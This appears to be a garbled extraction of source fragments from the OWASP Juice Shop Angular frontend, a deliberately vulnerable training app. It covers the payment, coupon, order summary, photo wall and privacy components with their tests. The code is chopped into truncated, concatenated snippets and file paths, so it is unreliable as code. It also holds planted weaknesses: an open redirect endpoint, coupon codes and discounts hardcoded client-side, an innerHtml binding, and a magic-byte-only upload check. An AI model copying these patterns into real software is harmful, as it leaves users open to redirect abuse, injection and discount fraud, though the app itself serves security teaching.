rror'))should hold delivery price on ngOnInitexpect( ... ual(10)'should ...  an id'should hold card on ngOnInit when paymentId is initialized to an idpayment ... 34' }))of({ ca ... 234' }){ cardN ... 1234' }cardNum ... **1234'************1234expect( ... 234' })expect( ... Method){ cardNum: '1234' }cardNum: '1234''should ... wallet'should be wallet on ngOnInit when paymentId is initialized to walletsession ... allet')expect( ... allet')should store prices on calling getMessagesession ... , '70')couponDiscountcompone ... 00, 1])[100, 1]expect( ... Be(100)expect( ... mTotal)component.itemTotalexpect( ... oBe(70)should remove session details from session storagebasketS ... 34' }))of({ or ... 234' }){ order ... 1234' }orderCo ... 341234'1234123412341234compone ... Order()component.placeOrderexpect( ... entId')expect( ... essId')expect( ... hodId')expect( ... tails')couponDetailsexpect( ... count')P:/My Drive/Git/juice-shop/frontend/src/app/order-summary/order-summary.component.ts'app-order-summary''./order-summary.component.html''./order-summary.component.scss''/order-completion'selecto ... ummary'app-order-summary./order-summary.component.html./order-summary.component.scsspublic bonus = 0public  ... od: anythis.de ... \n    })this.de ... odId'))this.de ... getByIdthis.deliveryServicesession ... hodId')this.de ... d.pricemethod.priceif (ses ... \r\n    }session ... wallet'session ... entId')this.pa ... err) })this.pa ... bscribethis.pa ... ntId'))this.pa ... getByIdthis.paymentService(card)  ...       }card.ca ... th - 4)String( ... th - 4)String( ... bstringString(card.cardNum)String( ... gth - 4String( ... .lengththis.pa ...  = cardthis.paymentMethodthis.pa ... wallet'getMess ... 1]\r\n  }this.it ... otal[0]this.pr ... tal : 0session ... tal : 0session ... count')(parseF ... emTotal(parseF ...  / 100)parseFl ... ) / 100parseFl ... ount'))placeOr ... })\r\n  }const o ... \r\n    }orderDe ... \r\n    }payment ... entId')address ... essId')deliver ... hodId')this.ba ... \n    })this.ba ... etails)this.ba ... heckoutNumber( ... 'bid'))btoa(se ... ails'))session ... tails')(orderC ... \r\n    }this.ng ... onId]))async ( ... ionId])await t ... ionId])this.ro ... ionId])['/orde ... tionId]err.err ... messageP:/My Drive/Git/juice-shop/frontend/src/app/payment/payment.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/paymentmode !== 'wallet'(wallet ... ce) < 0(wallet ... lPrice)walletB ... alPriceuseWalletuseWallet()couponPanelExpandedcouponConfirmationcouponControlcouponC ... l.dirty!couponControl.dirtycouponControl.dirtycouponErrorcouponE ... l.dirty'FOLLOW_FOR_MONTHLY_COUPONS'twitterfacebook'FOLLOW ... ookUrl}'FOLLOW ... OUPONS'FOLLOW_FOR_MONTHLY_COUPONS{twitte ... ookUrl}twitter: twitterUrlfaceboo ... bookUrl{{ 'ENTER_COUPON_CODE' | translate}}'ENTER_COUPON_CODE''ENTER_ ... anslateENTER_COUPON_CODEcouponC ... length)couponC ... invalid(coupon ... length)couponC ... xlengthcouponC ... nlengthcouponControl.errorsapplyCoupon()paymentPanelExpandedapplica ... e Shop'{juices ...  Shop'}juicesh ... e Shop'showBitcoinQrCodeshowBitcoinQrCode()showDashQrCodeshowDashQrCode()showEtherQrCodeshowEtherQrCode()payment ... wallet'payment ... definedchoosePaymentchoosePayment()mode != ... wallet'mode !== 'deluxe'mode === 'wallet'mat-own-card mat-elevation-z6margin-top: 20px; margin-bottom: 20px;text-align: center;margin-top: -27px;mode !== 'deluxe' && mode !== 'wallet'Proceed to reviewpaymentId === undefined && paymentMode !== 'wallet'mat-expansion-panel[expanded]button-containermargin-top: 6px;./redirect?to=http://leanpub.com/juice-shopfab fa-leanpub fa-lg./redirect?to=https://www.stickeryou.com/products/owasp-juice-shop/794fas fa-sticky-note fa-lg./redirect?to=http://shop.spreadshirt.de/juiceshopfas fa-tshirt fa-lg./redirect?to=http://shop.spreadshirt.com/juiceshopmargin-left: 3px;fas fa-thumbs-up confirmationapplicationName !== 'OWASP Juice Shop'applicationName === 'OWASP Juice Shop'{juiceshop: 'OWASP Juice Shop'}payment-labelfab fa-ethereum fa-lgfa-lgfab fa-btc fa-lghttps://pwning.owasp-juice.shop/part3/donations.html{{'BTN_CREDIT_CARD' | translate}}'BTN_CREDIT_CARD''BTN_CR ... anslateBTN_CREDIT_CARDfab fa-stripe fa-lgfas fa-heart errormat-expansion-panel-headermat-panel-title{{"OTHER_PAYMENT_OPTIONS" | translate}}"OTHER_PAYMENT_OPTIONS""OTHER_ ... anslate"OTHER_ ... PTIONS"OTHER_PAYMENT_OPTIONScollapseCouponElementapplyCouponButtonmargin-top:5px; float: right;couponControl.invalid{{'BTN_REDEEM' | translate}}'BTN_REDEEM'BTN_REDEEMcouponControl.invalid && (couponControl.errors.minlength || couponControl.errors.maxlength){{'COUPON_CODE_HINT' | translate}}'COUPON_CODE_HINT''COUPON ... anslateCOUPON_CODE_HINT{{coupon .value?.length || 0}}coupon  ... th || 0coupon  ... .lengthcoupon .value[innerHtml]'FOLLOW_FOR_MONTHLY_COUPONS' | translate:{twitter: twitterUrl, facebook: facebookUrl}couponError && !couponControl.dirty{{couponError?.error}}couponError?.errorcouponConfirmation && !couponControl.dirty{{
        couponConfirmation }}mat-panel-description{{"VOUCHERS_AND_PROMOTIONAL_CODE" | translate}}"VOUCHERS_AND_PROMOTIONAL_CODE""VOUCHE ... anslate"VOUCHE ... L_CODE"VOUCHERS_AND_PROMOTIONAL_CODE{{"ADD_A_COUPON" | translate}}"ADD_A_COUPON""ADD_A_ ... anslateADD_A_COUPONcustom-cardbtnfloat: right;(walletBalance - totalPrice) < 0{{'LABEL_PAY' | translate}}'LABEL_PAY'LABEL_PAY{{ totalPrice?.toFixed(2) }}totalPr ... ixed(2)totalPrice?.toFixedfas fa-hand-holding-usd fa-lg38%confirmation card-title{{ walletBalanceStr }}walletBalanceStrcard-title42%app-payment-method(emitSelection)[allowDelete]P:/My Drive/Git/juice-shop/frontend/src/app/payment/payment.component.spec.ts'./payment.component''../qr-code/qr-code.component''../order-summary/order-summary.component''../Services/wallet.service''../wallet/wallet.component''PaymentComponent'walletService'applyCoupon''should not hold twitter or facebook URL if not defined in configuration''should hold the default applicationName if not defined in configuration''should use custom twitter URL if configured''twitter''should use custom facebook URL if configured''facebook''should reinitizalise coupon code form by calling resetCouponForm'resetCouponForm'should reject an invalid coupon code''invalid_base85''should accept a valid coupon code''DISCOUNT_APPLIED''valid_base85''should translate DISCOUNT_APPLIED message''Translation of DISCOUNT_APPLIED''should store discount percent in session storage'showConfirmation'should store payment id on calling getMessage''card''should open QrCodeComponent for Bitcoin''bitcoin:1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm''./redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm''1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm''TITLE_BITCOIN_ADDRESS''should open QrCodeComponent for Dash''dash:Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW''./redirect?to=https://explorer.dash.org/address/Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW''Xr556RzuwX6hg5EGpkybbv5RanJoZN17kW''TITLE_DASH_ADDRESS''should open QrCodeComponent for Ether''0x0f933ab9fCAAA782D0279C300D73750e1311EAE6''./redirect?to=https://etherscan.io/address/0x0f933ab9fcaaa782d0279c300d73750e1311eae6''TITLE_ETHER_ADDRESS''should call initTotal on calling ngOnInit''initTotal'initTotal'should call initTotal on calling showConfirmation''should make paymentMode wallet on calling useWallet''should store paymentId in session storage on calling choosePayment in shop mode''should store wallet as paymentId in session storage on calling choosePayment while paymentMode is equal to wallet''should log error from upgrade to deluxe API call directly to browser console''should remove walletTotal from session storage on calling choosePayment in wallet mode''walletTotal''should add token to local storage and cookie on calling choosePayment in deluxe mode''tokenValue'./payment.component'../qr- ... ponent'../qr-code/qr-code.component../order-summary/order-summary.component../Services/wallet.service'../wal ... ponent'../wallet/wallet.componentlet basketServicelet dialoglet wal ... ce: anywalletService: anybasketS ... upon'])jasmine ... upon'])['applyCoupon']basketS ... pon.andbasketS ... yCoupon['remove', 'put']walletS ... 'put'])['get', 'put']walletS ... of({}))walletS ... rnValuewalletS ... get.andwalletService.getwalletS ... put.andwalletService.put[Paymen ... ponent]should not hold twitter or facebook URL if not defined in configurationshould hold the default applicationName if not defined in configurationshould use custom twitter URL if configuredapplica ... er' } }{ socia ... er' } }social: ... tter' }{ twitt ... tter' }twitter ... witter'expect( ... itter')should use custom facebook URL if configuredapplica ... ok' } }{ socia ... ok' } }social: ... book' }{ faceb ... book' }faceboo ... cebook'expect( ... ebook')'should ... onForm'should reinitizalise coupon code form by calling resetCouponFormcompone ... 67890')compone ... nForm()compone ... ponForm'should ... n code'should reject an invalid coupon codebasketS ... rror'))compone ... stine()compone ... uched()compone ... ase85')invalid_base85compone ... oupon()compone ... yCouponexpect( ... nError)compone ... onErrorshould accept a valid coupon codebasketS ... of(42))of(42)transla ... LIED'))of('DIS ... PLIED')DISCOUNT_APPLIEDvalid_base85{ discount: 42 }discount: 42should translate DISCOUNT_APPLIED messageof('Tra ... PLIED')'Transl ... PPLIED'Translation of DISCOUNT_APPLIEDexpect( ... PLIED')should store discount percent in session storagecompone ... ion(70)70 as anyshould store payment id on calling getMessagecomponent.paymentIdexpect( ... 'card')expect( ... ntMode)compone ... entMode'should ... itcoin'should open QrCodeComponent for Bitcoin() => { ... a)\r\n  }{\r\n     ... a)\r\n  }compone ... rCode()compone ... nQrCodeconst d ... \r\n    }data =  ... \r\n    }data: ' ... G8DRZm''bitcoi ... G8DRZm'bitcoin:1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZmurl: '. ... G8DRZm''./redi ... G8DRZm'./redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm/redirect?to=https://blockchainaddress ... G8DRZm''1AbKfg ... G8DRZm'1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZmtitle:  ... DDRESS''TITLE_ ... DDRESS'TITLE_BITCOIN_ADDRESSexpect( ... , data)'should ... r Dash'should open QrCodeComponent for Dashcompone ... hQrCodedata: ' ... ZN17kW''dash:X ... ZN17kW'dash:Xr556RzuwX6hg5EGpkybbv5RanJoZN17kWurl: '. ... ZN17kW''./redi ... ZN17kW'./redirect?to=https://explorer.dash.org/address/Xr556RzuwX6hg5EGpkybbv5RanJoZN17kWto=https://exploreraddress ... ZN17kW''Xr556R ... ZN17kW'Xr556RzuwX6hg5EGpkybbv5RanJoZN17kWTITLE_DASH_ADDRESS'should ...  Ether'should open QrCodeComponent for Ethercompone ... rQrCodedata: ' ... 11EAE6''0x0f93 ... 11EAE6'0x0f933ab9fCAAA782D0279C300D73750e1311EAE6url: '. ... 11eae6''./redi ... 11eae6'./redirect?to=https://etherscan.io/address/0x0f933ab9fcaaa782d0279c300d73750e1311eae6to=https://etherscanaddress ... 11EAE6'TITLE_ETHER_ADDRESSshould call initTotal on calling ngOnInitspyOn(c ... Total')expect( ... tTotal)component.initTotalshould call initTotal on calling showConfirmationcompone ... ion(10)'should ... Wallet'should make paymentMode wallet on calling useWalletcompone ... allet()component.useWallet'should ... p mode'should store paymentId in session storage on calling choosePayment in shop modecompone ...  'shop'compone ...  'card'compone ... tId = 1compone ... yment()compone ... Paymentshould store wallet as paymentId in session storage on calling choosePayment while paymentMode is equal to walletcompone ... wallet'should log error from upgrade to deluxe API call directly to browser consolecompone ... deluxe''should ... t mode'should remove walletTotal from session storage on calling choosePayment in wallet modewalletTotal'should ... e mode'should add token to local storage and cookie on calling choosePayment in deluxe modeuserSer ... ue' }))of({ to ... lue' }){ token ... alue' }token: 'tokenValue'tokenValuespyOn(l ... tItem')expect( ... Value')P:/My Drive/Git/juice-shop/frontend/src/app/payment/payment.component.tsfaCoffeefaGiftfaHandHoldingUsdfaHeartfaStickyNotefaThumbsUpfaTimesfaTshirtfaLeanpubfaStripe'app-payment''./payment.component.html''./payment.component.scss'campaignCouponclientDatecampaignsWMNSDY2019validOn155199960000075WMNSDY20201583622000000WMNSDY20211615158000000WMNSDY20221646694000000WMNSDY20231678230000000ORANGE20201588546800000ORANGE20211620082800000ORANGE20221651618800000ORANGE20231683154800000'couponPanelExpanded''paymentPanelExpanded''entity'offsetTimeZonecampaign'INVALID_COUPON'invalidCoupondiscountApplied'/wallet''CHARGED_WALLET''/deluxe-membership''INSUFFICIENT_WALLET_BALANCE''/order-summary'selecto ... ayment'app-payment'./paym ... t.html'./payment.component.html['./pay ... .scss']'./paym ... t.scss'./payment.component.scsspublic  ... or: anypublic  ... ny = {}private ...  stringpublic  ... h(10)])new Unt ... h(10)])[Valida ... th(10)]Validat ... gth(10)public  ... te: anypublic mode: anypublic  ... any = 0public  ...  'card'WMNSDY2 ... t: 75 }{ valid ... t: 75 }validOn ... 9600000discount: 75WMNSDY2 ... t: 60 }{ valid ... t: 60 }validOn ... 2000000discount: 60validOn ... 8000000validOn ... 4000000validOn ... 0000000ORANGE2 ... t: 50 }{ valid ... t: 50 }validOn ... 6800000discount: 50ORANGE2 ... t: 40 }{ valid ... t: 40 }validOn ... 2800000discount: 40validOn ... 8800000validOn ... 4800000this.initTotal()this.initTotalthis.wa ... err) })this.wa ... bscribethis.wa ... e.get()this.wa ... ice.getthis.walletService(balanc ... \r\n    }this.wa ... balancethis.walletBalancethis.wa ... ixed(2)this.wa ... anceStrparseFl ... ixed(2)parseFl ... toFixedparseFloat(balance)this.co ... : falsethis.co ... xpandedlocalSt ... : falselocalSt ... anded')'coupon ... panded'JSON.pa ... nded'))this.pa ... : falsethis.pa ... xpanded'paymen ... panded'initTot ... })\r\n  }this.mo ... ntity')paramMa ... ntity')entitythis.mo ... wallet'this.to ... otal'))this.totalPriceparseFl ... otal'))this.mo ... deluxe'(res) = ...       }this.to ... hipCostconst i ... otal'))itemTot ... otal'))const p ... tal : 0promoti ... tal : 0this.de ...      })(method ...       }const d ... d.pricedeliver ... d.pricethis.to ... iscountapplyCo ...  }\r\n  }this.campaignCouponthis.couponControlthis.cl ...  Date()this.clientDateconst o ...  * 1000offsetT ...  * 1000(this.c ...  * 1000(this.c ... 0) * 60(this.c ... ) + 60)this.cl ... () + 60this.cl ... ffset()this.cl ... eOffsetthis.cl ... , 0, 0)this.cl ... etHoursthis.cl ... imeZonethis.cl ... tTime()this.cl ... getTimesession ... Date}`)`${this ... tDate}`const c ... .value]campaig ... .value]this.ca ... .value]this.campaignsif (cam ... \r\n    }this.cl ... validOncampaign.validOnthis.sh ... scount)this.sh ... rmationcampaign.discountthis.tr ... OUPON')INVALID_COUPON(invali ...       }this.co ... oupon }this.couponError{ error ... oupon }error: invalidCouponthis.re ... nForm()this.resetCouponFormthis.ba ...      })this.ba ... value))this.ba ... yCouponencodeU ... .value)(discou ...       }this.co ... r = errshowCon ... ()\r\n  }session ... scount)this.tr ... ount }){ discount }(discou ... \r\n    }this.co ... AppliedgetMess ... d'\r\n  }{\r\n     ... d'\r\n  }this.paymentId = idthis.paymentIdthis.pa ...  'card'this.paymentModechooseP ...  }\r\n  }this.wa ...      })this.wa ... ntId })this.wa ... ice.put{ balan ... entId }balance ... alPricepayment ... ymentIdthis.ng ... let']))async ( ... llet'])await t ... llet'])this.ro ... llet'])['/wallet']CHARGED_WALLETerr.error?.messagethis.us ... mentId)this.us ... oDeluxe(data)  ...       }data.tokenthis.co ... .token)this.ng ... hip']))async ( ... ship'])await t ... ship'])this.ro ... ship'])['/delu ... rship']/deluxe-membershipthis.wa ... alPrice'INSUFF ... ALANCE'INSUFFICIENT_WALLET_BALANCEsession ... mentId)this.ng ... ary']))async ( ... mary'])await t ... mary'])this.ro ... mary'])['/order-summary']showBit ... })\r\n  }showDas ... })\r\n  }showEth ... })\r\n  }useWall ... ()\r\n  }this.choosePayment()this.choosePaymentresetCo ... ()\r\n  }P:/My Drive/Git/juice-shop/frontend/src/app/payment-method/payment-method.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/payment-methodcardsExistdelete(element.id)(element.id)monthControlmonthRange{{ i }}monthCo ... equiredmonthControl.invalidmonthControl.errorsyearControlyearRangeyearCon ... equiredyearControl.invalidyearControl.errorsnameCon ... invalidmargin-top:5px; float:right;nameControl.invalid || numberControl.invalid || monthControl.invalid || yearControl.invalidwidth: 45%yearControl.invalid && yearControl.errors.requiredlet i of yearRangewidth: 45%;margin-right: 10%;monthControl.invalid && monthControl.errors.requiredlet i of monthRange{{cardIn .value?.length || 0}}cardIncardIn  ... th || 0cardIn  ... .lengthcardIn .valuemargin-bottom: 12px;{{"ADD_NEW_CARD_DESCRIPTION" | translate}}"ADD_NEW_CARD_DESCRIPTION""ADD_NE ... anslate"ADD_NE ... IPTION"ADD_NEW_CARD_DESCRIPTION{{"ADD_NEW_CARD" | translate}}"ADD_NEW_CARD"ADD_NEW_CARDExpiry{{ element.expMonth }}element.expMonth{{ element.expYear }}element.expYear{{ element.fullName }}element.fullName35%{{ element.cardNum }}element.cardNumP:/My Drive/Git/juice-shop/frontend/src/app/payment-method/payment-method.component.spec.ts eslint-disable-next-line @typescript-eslint/no-loss-of-precision// esli ... ecision'./payment-method.component''PaymentMethodComponent''should hold cards returned by backend API''************1231''************6454'storedCards'should hold no cards on error in backend API''should hold no cards when none are returned by backend API''should log error while getting Cards from backend API directly to browser console''should reinitizalise new payment method form by calling resetForm'12345678876543212085'should be compulsory to provide card number''should be compulsory to provide month''should be compulsory to provide year''card number should be in the range [1000000000000000, 9999999999999999]'999999999999999999999999999999999'should reset the form on saving card and show confirmation''CREDIT_CARD_SAVED'cardnumber'should clear the form and display error if saving card fails'./payment-method.component/payment-method'Paymen ... ponent'let paymentServicepayment ... 'del'])['save' ...  'del']payment ... ave.andpaymentService.savepayment ... get.andpaymentService.getpayment ... del.andpaymentService.delshould hold cards returned by backend APIpayment ... 4' }]))of([{ c ... 54' }])[{ card ... 454' }]{ cardN ... 1231' }cardNum ... **1231'************1231{ cardN ... 6454' }cardNum ... **6454'************6454component.load()component.loadcompone ... edCardsexpect( ... *1231')expect( ... m).toBeexpect( ... ardNum)compone ... cardNumcompone ... ards[0]expect( ... *6454')compone ... ards[1]should hold no cards on error in backend APIshould hold no cards when none are returned by backend APIexpect( ... dCards)should log error while getting Cards from backend API directly to browser consoleshould reinitizalise new payment method form by calling resetFormcompone ... 654321)compone ... lue(12)compone ... e(2085)should be compulsory to provide card number'should ...  month'should be compulsory to provide month'should ... e year'should be compulsory to provide yearit('car ... )\r\n  })'card n ... 99999]'card number should be in the range [1000000000000000, 9999999999999999]card number should be in the range [1000000000000000, 9999999999999999]10000000000000000010000000000000000should reset the form on saving card and show confirmationtransla ... AVED'))of('CRE ... SAVED')CREDIT_CARD_SAVED{ cardn ... 1234' }cardnumber: '1234'expect( ... t.load)should clear the form and display error if saving card failspayment ... or' }))P:/My Drive/Git/juice-shop/frontend/src/app/payment-method/payment-method.component.ts'app-payment-method''./payment-method.component.html''./payment-method.component.scss''allowDelete'allowDelete'Number''Expiry'10000000000000002080savedCardscreditCardSaved./payment-method.component.html./payment-method.component.scss@Input( ... elete')Input('allowDelete')public  ... xpiry']['Numbe ... xpiry']Validat ... 000000)public  ... ds: anythis.mo ...  i + 1)this.monthRangeArray.f ...  i + 1)Array.f ... ()).mapArray.f ... keys())Array(12).keys()Array(12).keysArray(12)i => i + 1this.ye ... + 2080)this.yearRangeArray.f ... + 2080)Array(20).keys()Array(20).keysArray(20)i => i + 2080i + 2080this.allowDeletethis.pa ... e.get()this.pa ... ice.get(cards) ... \r\n    }this.ca ... .lengththis.cardsExistcards.lengththis.st ... = cardsthis.storedCardsthis.da ... dCards)new Mat ... dCards)this.card.fullNamethis.cardthis.card.cardNumthis.card.expMonththis.mo ... l.valuethis.monthControlthis.card.expYearthis.ye ... l.valuethis.yearControlthis.pa ... \n    })this.pa ... s.card)this.pa ... ce.savethis.tr ... - 4) }){ cardn ...  - 4) }cardnum ... th - 4)String( ... ardNum)savedCards.cardNum(credit ...       }delete  ... })\r\n  }this.pa ... del(id)this.pa ... ice.delemitSel ... d)\r\n  }{\r\n     ... d)\r\n  }this.mo ... uched()this.mo ... touchedthis.mo ... stine()this.mo ... ristinethis.mo ... lue('')this.mo ... etValuethis.ye ... uched()this.ye ... touchedthis.ye ... stine()this.ye ... ristinethis.ye ... lue('')this.ye ... etValueP:/My Drive/Git/juice-shop/frontend/src/app/photo-wall/mime-type.validator.tsP:/My Drive/Git/juice-shop/frontend/src/app/photo-wallObserverfileReaderfrObsobserver'loadend'isValid'89504e47'break'ffd8ffe0''ffd8ffe1''ffd8ffe2''ffd8ffe3''ffd8ffe8'invalidMimeTypetype Observerexport  ... rObs\r\n}const m ... rObs\r\n}mimeTyp ... rObs\r\n}(\r\n  co ... rObs\r\n}Promise ... , any>>Record<string, any>Observa ... , any>>{\r\n  if ... rObs\r\n}if (typ ... l)\r\n  }typeof  ... .value)(control.value)control.valuereturn of(null)const f ... as Filefile =  ... as Filecontrol ... as Fileconst f ... eader()fileRea ... eader()new FileReader()const f ...  }\r\n  )frObs = ...  }\r\n  )new Obs ...  }\r\n  )(observ ... \r\n    }Observe ... , any>>fileRea ...      })fileRea ... istenerloadendconst a ... y(0, 4)arr = n ... y(0, 4)new Uin ... y(0, 4)new Uin ... ubarraynew Uin ... Buffer)fileRea ... yBufferfileReader.resultlet header = ''header = ''let isValid = falseisValid = falsei < arr.lengtharr.lengthheader  ... ing(16)arr[i].toString(16)arr[i].toStringarr[i]switch  ...       }case '8 ...   break89504e47isValid = truecase 'ffd8ffe0':ffd8ffe0case 'ffd8ffe1':ffd8ffe1case 'ffd8ffe2':ffd8ffe2case 'ffd8ffe3':ffd8ffe3case 'f ...   breakffd8ffe8default ...   breakif (isV ...       }observer.next(null)observer.nextobserve ... true }){ inval ...  true }invalid ... e: trueobserver.complete()observer.completefileRea ... r(file)return frObsP:/My Drive/Git/juice-shop/frontend/src/app/photo-wall/photo-wall.component.html{{ image.url }}image.url{{ image.caption }}image.captiontwitterHandle{{ twitterHandle }}filePickerfilePicker.click()filePicker.clickonImagePickedonImage ... $event)imagePreviewimagePr ... ).validimagePr ... PreviewimagePreview !== ''form.ge ... ).validform.get('image')form.getform.value.captionform.valueform.ge ... invalidform.get('caption')heading mat-elevation-z6 mat-own-cardmargin-bottom:10px;margin-top: 10px;[formGroup]multipart/form-dataform.get('image').invalid || form.get('caption').invalidform.get('caption').invalid{{'MANDATORY_CAPTION' | translate}}'MANDATORY_CAPTION'MANDATORY_CAPTIONformControlNameimage-previewimagePreview !== '' && imagePreview && form.get('image').valid[alt]{{'LABEL_PICK_IMAGE' | translate}}'LABEL_PICK_IMAGE'LABEL_PICK_IMAGEmat-elevation-z0 emptyStategridlet image of slideshowDataSourcecontainer mat-elevation-z6overlayhttps://twitter.com/intent/tweet?text={{ image.caption }} {{ twitterHandle }}&hashtags=appsec{{"LABEL_PHOTO_WALL" | translate}}"LABEL_PHOTO_WALL"LABEL_PHOTO_WALLP:/My Drive/Git/juice-shop/frontend/src/app/photo-wall/photo-wall.component.spec.ts'./photo-wall.component''../Services/photo-wall.service''PhotoWallComponent'photoWallService'addMemory''should make emptyState true and hold no memories when get API gives empty response''should make emptyState false when get API gives non empty response''should log error from get API call directly to browser console''should log error from addMemory API call directly to browser console''should add new memory to photo wall''should reinitizalise add memory form by calling resetForm''Juice Party''should use custom twitter handle if configured'./photo-wall.component../Services/photo-wall.servicelet pho ... ce: anyphotoWa ... ce: anyphotoWa ... mory'])jasmine ... mory'])['get', 'addMemory']photoWa ... of([]))photoWa ... rnValuephotoWa ... get.andphotoWallService.getphotoWa ... of({}))photoWa ... ory.andphotoWa ... dMemory[PhotoWallComponent]should make emptyState true and hold no memories when get API gives empty responseexpect( ... Source)should make emptyState false when get API gives non empty responsephotoWa ... '' }]))of([{ i ...  '' }])[{ imag ... : '' }]{ image ... n: '' }imagePath: ''caption: ''should log error from get API call directly to browser consolephotoWa ... rror'))should log error from addMemory API call directly to browser console'should ... o wall'should add new memory to photo wallshould reinitizalise add memory form by calling resetFormcompone ... mage'))compone ... image')component.form.getcomponent.formcompone ... Party')compone ... ption')Juice Partycompone ... ).valueshould use custom twitter handle if configuredexpect( ... Handle)compone ... rHandleP:/My Drive/Git/juice-shop/frontend/src/app/photo-wall/photo-wall.component.tsUntypedFormGroup'./mime-type.validator''app-photo-wall''./photo-wall.component.html''./photo-wall.component.scss'validatorsasyncValidators} ( ${patchValueupdateValueAndValidityreader'IMAGE_UPLOAD_SUCCESS'setErrorsimport  ... idator''./mime ... idator'./mime-type.validator/mime-typevalidatorselecto ... o-wall'app-photo-wall'./phot ... t.html'./photo-wall.component.html['./pho ... .scss']'./phot ... t.scss'./photo-wall.component.scsspublic  ... )\r\n  })new Unt ... )\r\n  })image:  ... ype] })new Unt ... ype] }){ valid ... Type] }validat ... quired]asyncVa ... meType][mimeType]caption ... uired])this.sl ... ce = []this.ph ... err) })this.ph ... bscribethis.ph ... e.get()this.ph ... ice.getthis.ph ... Service(memori ... \r\n    }memorie ... h === 0memories.lengthmemory. ... sernamememory.Usermemory. ... name})``${memo ... name})` (\u00a9  ( memory.User.usernamethis.sl ... tion }){ url:  ... ption }url: me ... agePathmemory.imagePaththis.twitterHandleonImage ... e)\r\n  }const f ... iles[0]file =  ... iles[0](event. ... iles[0](event. ... ).filesthis.fo ... file })this.form.patchValuethis.form{ image: file }image: filethis.fo ... idity()this.fo ... aliditythis.fo ... image')this.form.getupdateV ... alidityconst r ... eader()reader  ... eader()reader. ... \r\n    }reader.onloadthis.im ...  stringthis.imagePreviewreader. ...  stringreader.resultreader. ... L(file)reader.readAsDataURLthis.ph ... \n    })this.ph ... .image)this.ph ... dMemorythis.fo ... captionthis.form.valuethis.fo ... e.image'IMAGE_ ... UCCESS'IMAGE_UPLOAD_SUCCESSresetFo ... l)\r\n  }this.fo ... ption')this.fo ... s(null)this.fo ... tErrorsP:/My Drive/Git/juice-shop/frontend/src/app/privacy-policy/privacy-policy.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/privacy-policyassets/public/images/padding/81px.pngulli{{privacyContactEmail}}dividerhotstrongh4{{applicationUrl}}applicationUrlhttps://www.freeprivacypolicy.com/Link to the page where the privacy policy was createdP:/My Drive/Git/juice-shop/frontend/src/app/privacy-policy/privacy-policy.component.spec.ts'./privacy-policy.component''PrivacyPolicyComponent'./privacy-policy.component/privacy-policy'Privac ... ponent'[Privac ... ponent]P:/My Drive/Git/juice-shop/frontend/src/app/privacy-policy/privacy-policy.component.ts'app-privacy-policy''./privacy-policy.component.html''./privacy-policy.component.scss''//'`donotreply@${selecto ... policy'app-privacy-policy'./priv ... t.html'./privacy-policy.component.html['./pri ... .scss']'./priv ... t.scss'./privacy-policy.component.scssthis.ap ... ostnamethis.applicationUrlthis._d ... ostnamethis._d ...  + '//'this._d ... rotocolthis._d ... ocationconfig? ... ctEmailthis.pr ... ctEmailconfig. ... ctEmailthis.pr ... tname}``donotr ... tname}`donotreply@P:/My Drive/Git/juice-shop/frontend/src/app/privacy-security/privacy-security.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/privacy-securitysidenav-containermat-sidenav-contentP:/My Drive/Git/juice-shop/frontend/src/app/privacy-security/privacy-security.component.spec.ts'./privacy-security.component''../change-password/change-password.component''PrivacySecurityComponent'./privacy-security.component/privacy-security'../cha ... ponent'../change-password/change-password.componentP:/My Drive/Git/juice-shop/frontend/src/app/privacy-security/privacy-security.component.tsBreakpointObserverBreakpoints'app-privacy-security''./privacy-security.component.html''./privacy-security.component.scss'IpwindowWidthisHandset$breakpointObserverHandsetexport  ... ) {}\r\n}class P ... ) {}\r\n}selecto ... curity''app-pr ... curity'app-privacy-security./privacy-security.component.html./privacy-security.component.scssIp!: stringwindowW ... erWidthwindow.innerWidthngAfter ... th\r\n  }{\r\n     ... th\r\n  }this.wi ... erWidththis.windowWidthisHands ... \r\n    )this.br ... \r\n    )this.br ...   .pipethis.br ... andset)this.br ... observethis.br ... bserverBreakpoints.Handsetmap(res ... atches)result  ... matchesresult.matchesObservable<boolean>constru ... ver) {}private ... bserverP:/My Drive/Git/juice-shop/frontend/src/app/product-details/product-details.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/product-details'assets/public/images/products/''assets ... a.image'assets ... ducts/'assets/public/images/products/data.pr ... a.imagedata.productData{{data.productData.name}}data.pr ... ta.namedata.pr ... riptiondata.pr ... nts > 0data.pr ... .points{{'LABEL_BONUS' | translate}}'LABEL_BONUS'LABEL_BONUS(reviews$| async)?.length >= 1; else emptyResultreviews$reviews$|async'Anonymous'editReviewreview. ... review)review. ...  authorreview. ... nymous'review.authorAnonymouseditReview(review){{review.author !== author}}{{'LABEL_EDIT_REVIEW' | translate}}'LABEL_EDIT_REVIEW'LABEL_EDIT_REVIEWlikeReviewlikeReview(review)review. ... gedIn()review.liked'block'isLogge ...  'none'reviewControl{{'WRITE_REVIEW_PLACEHOLDER' | translate}}textPut!textPu ... .trim()textPut.value.trim()textPut.value.trimtextPut.valueaddReviewaddReview(textPut)container mat-typography{{textPut.value?.length || 0}}textPut ... th || 0textPut ... .lengthExpand for Reviewslet review of reviews$|asyncreview.liked || !isLoggedIn()rw-buttonRate a helpful reviewfa-2x fa-layers fa-fwfa-layers-counter fa-layers-bottom-right accent-notificationfont-size: 32px;{{ review.likesCount }}review.likesCountreview-textreview.author !== 'Anonymous' && review.author === author && editReview(review)matTooltipDisabled{{ review.message }}review.message{{review.author}}{{(reviews$| async)?.length}}(review ... .length(reviews$| async)reviews$| asyncmargin-right: 5px;data.productData.points > 0Bonus points when buying the productfa-layers-counter fa-layers-bottom-left fa-2x warn-notification{{ data.productData.points }}fas fa-crownitem-price{{data.productData.price}}data.pr ... a.pricedata.productData.descriptionnoshrinkimg-thumbnail'assets/public/images/products/'+data.productData.imageP:/My 